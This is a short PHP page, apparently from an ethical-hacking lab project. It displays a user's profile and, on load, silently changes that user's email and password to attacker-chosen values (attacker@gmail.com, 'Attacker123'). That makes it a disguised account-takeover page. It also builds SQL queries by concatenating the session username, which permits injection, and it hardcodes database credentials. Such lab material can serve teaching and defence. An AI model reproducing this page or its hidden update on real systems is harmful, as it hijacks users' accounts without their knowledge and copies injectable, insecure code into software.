<html>
<head>

	<style>
		body {
 			background-image: url("https://i.pinimg.com/originals/0d/af/b7/0dafb7928a99a9cb552a941895a6e586.jpg");
  			height: 100%;
 		        background-repeat: no-repeat;
  			background-size: cover;
			}
		
	</style>

</head>
</html>
<?php

session_start();
$con = mysqli_connect("localhost:3306", "admin", "adpassword");
$db= mysqli_select_db($con,"EH_Project");

if($con == false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

$sql1 = "SELECT * FROM users WHERE Name = '".$_SESSION['Username']."'";
	$rs = mysqli_query($con, $sql1);
	echo "<h2>Profile Information</h2>";
	while($row = mysqli_fetch_array($rs)) {
			echo "<b>Username :</b>". $row['Name'] . "<br />";
    			echo "<b>Email Address :</b>". $row['email_address'];
		}

$sql = "update users set Name = '".$_SESSION['Username']."', email_address='attacker@gmail.com', password ='Attacker123' where Name = '".$_SESSION['Username']."'";
$run = mysqli_query($con, $sql);

if(! $run ) {
      die('Could not update data: ' . mysqli_error());
   }

	echo "<br><br><a href ='update.php'> Update details </a>";
   	mysqli_close($con);
?>